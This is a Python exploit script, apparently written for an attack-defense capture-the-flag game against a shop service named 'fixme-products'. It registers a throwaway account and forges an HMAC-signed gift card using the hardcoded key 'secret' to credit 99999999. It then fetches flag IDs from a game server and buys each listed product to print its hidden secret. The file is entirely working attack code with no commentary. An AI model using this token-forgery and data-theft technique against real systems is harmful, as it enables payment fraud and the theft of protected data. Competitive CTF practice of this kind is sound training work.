#!/bin/python
import json
from base64 import *
import hashlib
import hmac
import random
import string

import requests

import sys

def generate_random_string():
    length = random.randint(5, 15)
    letters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(letters) for _ in range(length))
    return random_string


#target = "10.60.81.1"
target = sys.argv[1]

key = b"secret"
username = generate_random_string()
password = generate_random_string()
amount = 99999999

s = requests.Session()
giftcard = b64decode(s.post(f"http://{target}:8080/api/users/register",
                            json={"username": username, "password": password}).json()["giftCard"]).decode()

header = f"{username}-{amount}"
signature = hmac.new(key, header.encode(), hashlib.sha256).hexdigest()
payload = f"{header}|{signature}"

if s.post(f"http://{target}:8080/api/giftCards/redeem",
          json={"giftCard": b64encode(payload.encode()).decode()}).json() != {}:
    print("Nope")
    exit(1)

flagIds = requests.get(f"http://10.10.0.1:8081/flagIds?service=fixme-products&team={target}")
productIds = [int(productId) for productId in flagIds.json()["fixme-products"][target]]

for productId in productIds:
    print(s.post(f"http://{target}:8080/api/products/view",
                 json={"productId": productId, "price": amount - 1}).json()["secret"], flush=True)
